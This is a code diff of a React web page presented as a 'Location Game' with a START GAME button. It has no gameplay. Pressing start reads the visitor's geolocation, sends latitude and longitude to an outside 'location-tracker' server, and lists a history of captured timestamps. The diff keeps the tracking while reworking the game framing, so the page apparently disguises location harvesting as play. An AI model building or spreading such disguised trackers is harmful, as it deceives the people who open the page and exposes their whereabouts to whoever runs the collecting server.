@@ -1,26 +1,24 @@
 import { useState } from "react";
 
 function App() {
-  const [status, setStatus] = useState("🎮 Click Start to begin mission");
-  const [started, setStarted] = useState(false);
+  const [status, setStatus] = useState("🎮 Press START to play");
+  const [history, setHistory] = useState([]);
 
-  const startTracking = () => {
-    setStarted(true);
-    setStatus("🛰️ Initializing GPS...");
-
+  const startGame = () => {
     if (!navigator.geolocation) {
-      setStatus("❌ Device not supported");
+      setStatus("❌ Not supported");
       return;
     }
+
+    setStatus("📡 Detecting location...");
 
     navigator.geolocation.getCurrentPosition(
       async (pos) => {
         const lat = pos.coords.latitude;
         const lng = pos.coords.longitude;
 
-        setStatus("📡 Sending data to server...");
-
         try {
+          // ✅ Send to backend
           await fetch("https://location-tracker-km22.onrender.com/location", {
             method: "POST",
             headers: {
@@ -29,70 +27,82 @@ function App() {
             body: JSON.stringify({ lat, lng }),
           });
 
-          setStatus("✅ Mission Success 🚀");
+          setStatus("🏆 Location captured!");
+
+          // ✅ Fetch history (IST)
+          const res = await fetch("https://location-tracker-km22.onrender.com/locations");
+          const data = await res.json();
+          setHistory(data);
+
         } catch (err) {
-          setStatus("❌ Server error");
+          setStatus("❌ Error sending data");
         }
       },
       () => {
         setStatus("❌ Permission denied");
-      },
-      {
-        enableHighAccuracy: true,
       }
     );
   };
 
   return (
     <div style={styles.container}>
-      <h1 style={styles.title}>🎮 Geo Tracker Game</h1>
+      <h1 style={styles.title}>🎮 Location Game</h1>
 
-      {!started ? (
-        <button style={styles.button} onClick={startTracking}>
-          ▶ Start Mission
-        </button>
-      ) : (
-        <div style={styles.card}>
-          <p style={styles.status}>{status}</p>
-        </div>
-      )}
+      <button style={styles.button} onClick={startGame}>
+        ▶ START GAME
+      </button>
+
+      <p style={styles.status}>{status}</p>
+
+      {/* ✅ HISTORY */}
+      <div style={styles.history}>
+        <h2>📜 History (IST)</h2>
+
+        {history.map((item, index) => (
+          <div key={index} style={styles.card}>
+            🕒 {item.time}
+          </div>
+        ))}
+      </div>
     </div>
   );
 }
 
 const styles = {
   container: {
-    height: "100vh",
+    minHeight: "100vh",
+    background: "#0f172a",
+    color: "#fff",
     display: "flex",
     flexDirection: "column",
-    justifyContent: "center",
     alignItems: "center",
-    background: "linear-gradient(135deg, #0f172a, #1e293b)",
-    color: "white",
-    fontFamily: "Arial",
+    paddingTop: "50px",
   },
   title: {
     fontSize: "40px",
-    marginBottom: "30px",
+    marginBottom: "20px",
   },
   button: {
     padding: "15px 30px",
     fontSize: "18px",
-    borderRadius: "10px",
-    border: "none",
-    cursor: "pointer",
     background: "#22c55e",
-    color: "white",
-    transition: "0.3s",
-  },
-  card: {
-    padding: "30px",
-    borderRadius: "15px",
-    background: "#1e293b",
-    boxShadow: "0 0 20px rgba(0,0,0,0.5)",
+    border: "none",
+    borderRadius: "10px",
+    cursor: "pointer",
   },
   status: {
-    fontSize: "20px",
+    marginTop: "20px",
+    fontSize: "18px",
+  },
+  history: {
+    marginTop: "40px",
+    width: "80%",
+  },
+  card: {
+    background: "#1e293b",
+    padding: "10px",
+    margin: "10px 0",
+    borderRadius: "8px",
   },
 };
 
